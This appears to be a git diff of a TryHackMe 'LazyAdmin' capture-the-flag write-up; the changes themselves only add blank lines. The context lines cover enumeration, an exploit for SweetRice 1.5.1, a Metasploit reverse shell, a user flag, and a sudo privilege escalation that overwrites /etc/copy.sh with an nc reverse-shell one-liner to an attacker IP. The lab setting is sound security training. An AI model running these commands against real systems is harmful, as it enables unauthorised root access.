@@ -26,6 +26,7 @@ PING 10.10.198.128 (10.10.198.128) 56(84) bytes of data.
 rtt min/avg/max/mdev = 213.750/218.906/224.133/3.873 ms
 ```
 -----
+
 **Host Enumeration**
 After confirming that  I can reach the target. I ran an nmap scan.
 
@@ -135,6 +136,7 @@ attachment              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration:
 ```
 
 **Further enumeration**
+
 ```
 Sweet Rice Version 1.5.1: http://10.10.198.128/content/inc/lastest.txt
 mysql_bakup_20191129023059-1.5.1.sql: http://10.10.198.128/content/inc/mysql_backup/
@@ -192,6 +194,7 @@ Copied to: /root/Desktop/Tryhackme/LazyAdmin/40700.html
 
 ```
 **Contents of 40700.html**
+
 To summarize, the contents of this html file, a php reverse shell can be generated
 ```
 # Description :
@@ -221,6 +224,7 @@ Payload size: 34849 bytes
 
 ```
 **Starting Metasploit**
+
 I  then start metasploit and the following commands. 
 ```
 msfconsole -q                                                                         
@@ -282,6 +286,7 @@ THM{63e5bce9271952aad1113b6f1ac28a07}
 
 
 **Privilege Escalation**
+
 The user www-data has root privileges to run perl and run a script called backup. pl
 ```
 meterpreter > shell
@@ -297,6 +302,7 @@ User www-data may run the following commands on THM-Chal:
 
 ```
 **backup. pl**
+
 The backup. pl file is a perl script that executes a shell script
 ```
 cat /home/itguy/backup.pl
@@ -306,6 +312,7 @@ system("sh", "/etc/copy.sh");
 
 ```
 **copy. sh**
+
 The copy. sh script creates a reverse shell
 ```
 cat /etc/copy.sh
@@ -314,6 +321,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 
 
 **Root Reverse Shell**
+
 I replaced the IP address in the copy .sh script with my IP (tun0) and replaced the contents of the copy. sh script. After this I ran netcat. Once I ran the the backup .pl script with the sudo command a new reverse shell is created as a root user. I can now read the root.txt flag under the root directory
 ```
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.39 5554 >/tmp/f" > /etc/copy.sh
